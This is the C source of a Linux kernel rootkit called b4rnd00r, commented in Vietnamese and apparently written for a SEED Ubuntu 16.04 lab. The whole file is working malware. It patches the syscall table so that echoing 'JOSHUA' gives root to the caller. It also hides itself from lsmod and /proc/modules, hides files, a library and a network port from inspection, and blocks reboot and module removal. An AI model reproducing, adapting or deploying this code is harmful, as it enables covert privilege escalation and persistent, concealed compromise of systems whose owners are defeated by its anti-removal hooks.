/*
 * b4rnd00r v1.0 - Stealth Kernel Backdoor
 *
 * Backdoor hoàn toàn ẩn mật - KHÔNG tạo bất kỳ file nào:
 *   - Không có /dev/b4rn
 *   - Không cần file trigger trên filesystem
 *
 * Cơ chế hoạt động:
 *   Hook sys_write(): khi bash gọi echo "JOSHUA" => bash gọi
 *   write(fd=1, "JOSHUA\n", ...) trực tiếp KHÔNG FORK.
 *   Hook bắt được magic string => commit_creds(prepare_kernel_cred(0))
 *   => escalate ngay tiến trình bash lên root.
 *
 * Kích hoạt:
 *   $ echo "JOSHUA"     <- bash gọi write(1,...) trực tiếp, không fork
 *   $ whoami            <- root
 *
 * Các tính năng ẩn mật khác:
 *   - Ẩn chính module khỏi lsmod / /proc/modules
 *   - Ẩn file có tiền tố "libtest.so.1.0" khỏi ls/find
 *   - Ẩn thư viện độc hại khỏi /proc/<pid>/maps
 *
 * Tương thích: SEED Ubuntu 16.04, kernel 4.8.x (< 4.17)
 */

#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <asm/special_insns.h>
#include <asm/tlbflush.h>
#include <net/tcp.h>
#include <net/net_namespace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("s00butai");
MODULE_DESCRIPTION("This is not a rootkit.");
MODULE_VERSION("1.0");

/* ===== Biến toàn cục ===== */
extern unsigned long loops_per_jiffy;

static unsigned long *syscall_table;
static unsigned long *seq_show_addr;
static int (*fixed_set_memory_rw)(unsigned long, int);
static int (*fixed_set_memory_ro)(unsigned long, int);
static struct file_operations *proc_modules_operations;
static int (*old_seq_show)(struct seq_file *seq, void *v);

/* ===== Hằng số ===== */
#define GETDENTS_SYSCALL_NUM    __NR_getdents
#define GETDENTS64_SYSCALL_NUM  __NR_getdents64
#define CR0_WP                  (1u << 16)

#define HIDE_PREFIX     "libtest.so.1.0"
#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
#define MODULE_NAME     "b4rn"
#define MODULE_NAME_SZ  (sizeof(MODULE_NAME) - 1)

/*
 * BACKDOOR_MAGIC: chuỗi bí mật.
 * Khi bash chạy: echo "JOSHUA"
 * bash gọi write(1, "JOSHUA\n", 7) TRỰC TIẾP (built-in echo, không fork).
 * Hook bắt được => cấp root cho bash process ngay lập tức.
 */
#define BACKDOOR_MAGIC      "JOSHUA"
#define BACKDOOR_MAGIC_LEN  (sizeof(BACKDOOR_MAGIC) - 1)

#define BACKDOOR_PORT       9474

/* ===== Struct dirent ===== */
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};


/* =================================================================
 * PHẦN 1: BẢO VỆ BỘ NHỚ
 * ================================================================= */

static inline void
tlb_flush_hard(void)
{
    __flush_tlb_all();
}

static inline void
unprotect_page(unsigned long addr)
{
    write_cr0(read_cr0() & (~CR0_WP));
    fixed_set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
    tlb_flush_hard();
}

static inline void
protect_page(unsigned long addr)
{
    write_cr0(read_cr0() | CR0_WP);
    fixed_set_memory_ro(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
    tlb_flush_hard();
}


/* =================================================================
 * PHẦN 2: CẤP QUYỀN ROOT (dùng prepare_kernel_cred để an toàn)
 * ================================================================= */

static void
do_escalate(void)
{
    struct cred *new = prepare_kernel_cred(0);  /* tạo creds của root kernel */
    if (new) {
        commit_creds(new);
        printk(KERN_INFO "[b4rn] Root granted to PID %d (%s)\n",
               current->pid, current->comm);
    }
}


/* =================================================================
 * PHẦN 3: HOOK sys_write — TRIGGER BACKDOOR
 *
 * Tại sao echo "JOSHUA" hoạt động:
 *   - bash built-in `echo` gọi write(1, buf, len) TRỰC TIẾP
 *   - KHÔNG fork process con
 *   - current = bash process
 *   - commit_creds(root) => bash trở thành root ngay lập tức
 *   - whoami => root ✓
 *
 * Không cần tạo file, không cần device, không lộ gì cả.
 * ================================================================= */

typedef asmlinkage long (*sys_write_t)(unsigned int fd,
                                       const char __user *buf,
                                       size_t count);
static sys_write_t sys_write_orig = NULL;

static asmlinkage long
sys_write_new(unsigned int fd, const char __user *buf, size_t count)
{
    /*
     * Chỉ kiểm tra khi:
     *   - fd == 1 (stdout): echo ghi ra stdout
     *   - count >= BACKDOOR_MAGIC_LEN: đủ dài để chứa magic string
     *   - Chưa là root (tránh vòng lặp vô nghĩa)
     */
    if (fd == 1 && count >= BACKDOOR_MAGIC_LEN &&
            current_uid().val != 0) {

        char kbuf[BACKDOOR_MAGIC_LEN + 1];
        memset(kbuf, 0, sizeof(kbuf));

        /* Copy đúng BACKDOOR_MAGIC_LEN byte từ userspace */
        if (copy_from_user(kbuf, buf, BACKDOOR_MAGIC_LEN) == 0) {
            if (memcmp(kbuf, BACKDOOR_MAGIC, BACKDOOR_MAGIC_LEN) == 0) {
                do_escalate();
            }
        }
    }

    /* Luôn gọi write gốc để output vẫn hiện bình thường */
    return sys_write_orig(fd, buf, count);
}


/* =================================================================
 * PHẦN 4: HOOK getdents — ẨN FILE ROOTKIT VÀ LIBTEST
 * ================================================================= */

typedef asmlinkage long (*sys_getdents_t)(unsigned int, struct linux_dirent __user *, unsigned int);
static sys_getdents_t sys_getdents_orig = NULL;

typedef asmlinkage long (*sys_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
static sys_getdents64_t sys_getdents64_orig = NULL;

static asmlinkage long
sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
    int boff;
    char *dbuf;
    struct linux_dirent *ent;
    long ret = sys_getdents_orig(fd, dirent, count);

    if (ret <= 0) return ret;

    dbuf = kmalloc(ret, GFP_KERNEL);
    if (!dbuf) return ret;
    memset(dbuf, 0, ret);
    copy_from_user(dbuf, dirent, ret);

    for (boff = 0; boff < ret;) {
        ent = (struct linux_dirent *)(dbuf + boff);

        if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) ||
                (strstr(ent->d_name, MODULE_NAME) != NULL)) {
            size_t reclen = ent->d_reclen;
            memcpy(dbuf + boff, dbuf + boff + reclen,
                   ret - (boff + reclen));
            ret -= reclen;
            continue;
        }
        boff += ent->d_reclen;
    }

    copy_to_user(dirent, dbuf, ret);
    kfree(dbuf);
    return ret;
}

static asmlinkage long
sys_getdents64_new(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    int boff;
    char *dbuf;
    struct linux_dirent64 *ent;
    long ret = sys_getdents64_orig(fd, dirent, count);

    if (ret <= 0) return ret;

    dbuf = kmalloc(ret, GFP_KERNEL);
    if (!dbuf) return ret;
    memset(dbuf, 0, ret);
    copy_from_user(dbuf, dirent, ret);

    for (boff = 0; boff < ret;) {
        ent = (struct linux_dirent64 *)(dbuf + boff);

        if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) ||
                (strstr(ent->d_name, MODULE_NAME) != NULL)) {
            size_t reclen = ent->d_reclen;
            memcpy(dbuf + boff, dbuf + boff + reclen,
                   ret - (boff + reclen));
            ret -= reclen;
            continue;
        }
        boff += ent->d_reclen;
    }

    copy_to_user(dirent, dbuf, ret);
    kfree(dbuf);
    return ret;
}


/* =================================================================
 * PHẦN 4.5: HOOK REBOOT VÀ DELETE_MODULE — NGĂN CHẶN GỠ BỎ ROOTKIT
 * ================================================================= */

typedef asmlinkage long (*sys_reboot_t)(int magic1, int magic2, int cmd, void __user *arg);
static sys_reboot_t sys_reboot_orig = NULL;

typedef asmlinkage long (*sys_delete_module_t)(const char __user *name_user, unsigned int flags);
static sys_delete_module_t sys_delete_module_orig = NULL;

static asmlinkage long
sys_reboot_new(int magic1, int magic2, int cmd, void __user *arg)
{
    printk(KERN_INFO "[b4rn] Anti-reboot: Blocked reboot attempt!\n");
    return -EPERM;
}

static asmlinkage long
sys_delete_module_new(const char __user *name_user, unsigned int flags)
{
    char name[64];
    if (copy_from_user(name, name_user, sizeof(name) - 1) == 0) {
        name[sizeof(name) - 1] = '\0';
        if (strcmp(name, MODULE_NAME) == 0 || strcmp(name, "b4rnd00r") == 0) {
            printk(KERN_INFO "[b4rn] Anti-rmmod: Blocked unload attempt for module %s!\n", name);
            return -EPERM;
        }
    }
    return sys_delete_module_orig(name_user, flags);
}


/* =================================================================
 * PHẦN 5: ẨN MODULE KHỎI /proc/modules
 * ================================================================= */

typedef ssize_t (*proc_modules_read_t)(struct file *, char __user *, size_t, loff_t *);
static proc_modules_read_t proc_modules_read_orig = NULL;

static ssize_t
proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff_t *offset)
{
    char *kbuf, *bad_line, *bad_line_end;
    ssize_t ret = proc_modules_read_orig(f, buf, len, offset);

    if (ret <= 0) return ret;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    memset(kbuf, 0, ret);
    copy_from_user(kbuf, buf, ret);
    bad_line = strnstr(kbuf, MODULE_NAME, ret);

    if (bad_line) {
        for (bad_line_end = bad_line;
             bad_line_end < (kbuf + ret);
             bad_line_end++) {
            if (*bad_line_end == '\n') {
                bad_line_end++;
                break;
            }
        }
        memcpy(bad_line, bad_line_end, (kbuf + ret) - bad_line_end);
        ret -= (ssize_t)(bad_line_end - bad_line);
    }

    copy_to_user(buf, kbuf, ret);
    kfree(kbuf);
    return ret;
}


/* =================================================================
 * PHẦN 6: ẨN THƯ VIỆN KHỎI /proc/PID/maps
 * ================================================================= */

static int
hide_seq_show(struct seq_file *seq, void *v)
{
    int ret, prev_len, this_len;
    prev_len = seq->count;
    ret      = old_seq_show(seq, v);
    this_len = seq->count - prev_len;
    if (strnstr(seq->buf + prev_len, HIDE_PREFIX, this_len))
        seq->count -= this_len;
    return ret;
}

static void *
hook_pid_maps_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct seq_file *seq;

    if (IS_ERR_OR_NULL(filep = filp_open(path, O_RDONLY, 0)))
        return NULL;

    seq           = (struct seq_file *)filep->private_data;
    ret           = seq->op->show;
    old_seq_show  = seq->op->show;
    seq_show_addr = (unsigned long *)&seq->op->show;

    unprotect_page((unsigned long)seq_show_addr);
    *seq_show_addr = (unsigned long)hide_seq_show;
    protect_page((unsigned long)seq_show_addr);

    filp_close(filep, 0);
    return ret;
}


/* =================================================================
 * PHẦN 6.5: HOOK /proc/net/tcp — ẨN KẾT NỐI MẠNG (SỬ DỤNG KALLSYMS)
 * ================================================================= */

static struct seq_operations *tcp4_seq_ops_ptr = NULL;
static struct seq_operations *tcp6_seq_ops_ptr = NULL;

static int (*old_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
static int (*old_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;

static int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret, prev_len, this_len;
    char port_hex[16];

    /* Port 9474 in hex is 2502. The format in /proc/net/tcp is IP:PORT */
    snprintf(port_hex, sizeof(port_hex), ":%04X", BACKDOOR_PORT);

    prev_len = seq->count;
    ret      = old_tcp4_seq_show(seq, v);
    this_len = seq->count - prev_len;

    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
        seq->count -= this_len; /* Xóa dòng này khỏi output */
    }
    return ret;
}

static int new_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret, prev_len, this_len;
    char port_hex[16];

    snprintf(port_hex, sizeof(port_hex), ":%04X", BACKDOOR_PORT);

    prev_len = seq->count;
    ret      = old_tcp6_seq_show(seq, v);
    this_len = seq->count - prev_len;

    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
        seq->count -= this_len; /* Xóa dòng này khỏi output */
    }
    return ret;
}

static int init_proc_net_tcp_hook(void)
{
    tcp4_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops");
    if (tcp4_seq_ops_ptr) {
        old_tcp4_seq_show = tcp4_seq_ops_ptr->show;
        unprotect_page((unsigned long)tcp4_seq_ops_ptr);
        tcp4_seq_ops_ptr->show = new_tcp4_seq_show;
        protect_page((unsigned long)tcp4_seq_ops_ptr);
        printk(KERN_INFO "[b4rn] Hooked tcp4_seq_ops (/proc/net/tcp)\n");
    }

    tcp6_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops");
    if (tcp6_seq_ops_ptr) {
        old_tcp6_seq_show = tcp6_seq_ops_ptr->show;
        unprotect_page((unsigned long)tcp6_seq_ops_ptr);
        tcp6_seq_ops_ptr->show = new_tcp6_seq_show;
        protect_page((unsigned long)tcp6_seq_ops_ptr);
        printk(KERN_INFO "[b4rn] Hooked tcp6_seq_ops (/proc/net/tcp6)\n");
    }

    if (!tcp4_seq_ops_ptr && !tcp6_seq_ops_ptr) {
        printk(KERN_ERR "[b4rn] Could not find tcp4_seq_ops or tcp6_seq_ops\n");
        return -1;
    }
    
    return 0;
}

static void deinit_proc_net_tcp_hook(void)
{
    if (tcp4_seq_ops_ptr && old_tcp4_seq_show) {
        unprotect_page((unsigned long)tcp4_seq_ops_ptr);
        tcp4_seq_ops_ptr->show = old_tcp4_seq_show;
        protect_page((unsigned long)tcp4_seq_ops_ptr);
        printk(KERN_INFO "[b4rn] Unhooked tcp4_seq_ops\n");
    }
    if (tcp6_seq_ops_ptr && old_tcp6_seq_show) {
        unprotect_page((unsigned long)tcp6_seq_ops_ptr);
        tcp6_seq_ops_ptr->show = old_tcp6_seq_show;
        protect_page((unsigned long)tcp6_seq_ops_ptr);
        printk(KERN_INFO "[b4rn] Unhooked tcp6_seq_ops\n");
    }
}


/* =================================================================
 * PHẦN 7: TÌM SYSCALL TABLE (kernel 4.8 - scan memory)
 * ================================================================= */

static unsigned long *
find_syscall_table(void)
{
    unsigned long ptr;
    unsigned long *p;

    for (ptr = (unsigned long)sys_close;
         ptr < (unsigned long)&loops_per_jiffy;
         ptr += sizeof(void *)) {
        p = (unsigned long *)ptr;
        if (p[__NR_close] == (unsigned long)sys_close)
            return (unsigned long *)p;
    }
    printk(KERN_ERR "[b4rn] syscall table not found\n");
    return NULL;
}


/* =================================================================
 * PHẦN 8: INIT / EXIT
 * ================================================================= */

static int
init_overrides(void)
{
    fixed_set_memory_rw = (void *)kallsyms_lookup_name("set_memory_rw");
    if (!fixed_set_memory_rw) {
        printk(KERN_ERR "[b4rn] Cannot find set_memory_rw\n");
        return -1;
    }
    fixed_set_memory_ro = (void *)kallsyms_lookup_name("set_memory_ro");
    if (!fixed_set_memory_ro) {
        printk(KERN_ERR "[b4rn] Cannot find set_memory_ro\n");
        return -1;
    }
    return 0;
}

static int
init_syscall_tab(void)
{
    syscall_table = (unsigned long *)find_syscall_table();
    if (!syscall_table) return -1;

    /* Lưu con trỏ hàm gốc */
    sys_write_orig      = (sys_write_t)     ((void **)syscall_table)[__NR_write];
    sys_getdents_orig   = (sys_getdents_t)  ((void **)syscall_table)[GETDENTS_SYSCALL_NUM];
    sys_getdents64_orig = (sys_getdents64_t)((void **)syscall_table)[GETDENTS64_SYSCALL_NUM];
    sys_reboot_orig     = (sys_reboot_t)    ((void **)syscall_table)[__NR_reboot];
    sys_delete_module_orig = (sys_delete_module_t)((void **)syscall_table)[__NR_delete_module];

    /* Cài hook */
    unprotect_page((unsigned long)syscall_table);
    syscall_table[__NR_write]             = (unsigned long)sys_write_new;
    syscall_table[GETDENTS_SYSCALL_NUM]   = (unsigned long)sys_getdents_new;
    syscall_table[GETDENTS64_SYSCALL_NUM] = (unsigned long)sys_getdents64_new;
    syscall_table[__NR_reboot]            = (unsigned long)sys_reboot_new;
    syscall_table[__NR_delete_module]     = (unsigned long)sys_delete_module_new;
    protect_page((unsigned long)syscall_table);

    printk(KERN_INFO "[b4rn] Hooks installed: write, getdents, getdents64, reboot, delete_module\n");
    return 0;
}

static int
init_proc_mods(void)
{
    proc_modules_operations = (struct file_operations *)
        kallsyms_lookup_name("proc_modules_operations");
    if (!proc_modules_operations) {
        printk(KERN_ERR "[b4rn] Cannot find proc_modules_operations\n");
        return -1;
    }
    proc_modules_read_orig = proc_modules_operations->read;
    unprotect_page((unsigned long)proc_modules_operations);
    proc_modules_operations->read = proc_modules_read_new;
    protect_page((unsigned long)proc_modules_operations);
    return 0;
}

static int
init_proc_maps(void)
{
    void *old_show = hook_pid_maps_seq_show("/proc/self/maps");
    if (!old_show) {
        printk(KERN_ERR "[b4rn] Cannot hook /proc/maps\n");
        return -1;
    }
    printk(KERN_INFO "[b4rn] /proc/maps hook: @%p\n", old_show);
    return 0;
}

static __init int
b4rn_init(void)
{
    printk(KERN_INFO "[b4rn] Loading v1.0 (write-hook backdoor)\n");
    printk(KERN_INFO "[b4rn] Magic: echo \"%s\"\n", BACKDOOR_MAGIC);

    if (init_overrides())   return -1;
    if (init_proc_mods())   return -1;
    if (init_proc_maps())   return -1;
    if (init_proc_net_tcp_hook()) return -1;
    if (init_syscall_tab()) return -1;

    printk(KERN_INFO "[b4rn] Ready! Run: echo \"%s\" => root\n",
           BACKDOOR_MAGIC);
    return 0;
}

static void
deinit_syscall_tab(void)
{
    if (!syscall_table) return;
    unprotect_page((unsigned long)syscall_table);
    syscall_table[__NR_write]             = (unsigned long)sys_write_orig;
    syscall_table[GETDENTS_SYSCALL_NUM]   = (unsigned long)sys_getdents_orig;
    syscall_table[GETDENTS64_SYSCALL_NUM] = (unsigned long)sys_getdents64_orig;
    syscall_table[__NR_reboot]            = (unsigned long)sys_reboot_orig;
    syscall_table[__NR_delete_module]     = (unsigned long)sys_delete_module_orig;
    protect_page((unsigned long)syscall_table);
}

static void
deinit_proc_mods(void)
{
    if (!proc_modules_operations) return;
    unprotect_page((unsigned long)proc_modules_operations);
    proc_modules_operations->read = proc_modules_read_orig;
    protect_page((unsigned long)proc_modules_operations);
}

static void
deinit_proc_maps(void)
{
    if (!seq_show_addr) return;
    unprotect_page((unsigned long)seq_show_addr);
    *seq_show_addr = (unsigned long)old_seq_show;
    protect_page((unsigned long)seq_show_addr);
}

static __exit void
b4rn_deinit(void)
{
    deinit_syscall_tab();
    deinit_proc_net_tcp_hook();
    deinit_proc_maps();
    deinit_proc_mods();
    printk(KERN_INFO "[b4rn] Unloaded\n");
}

module_init(b4rn_init);
module_exit(b4rn_deinit);
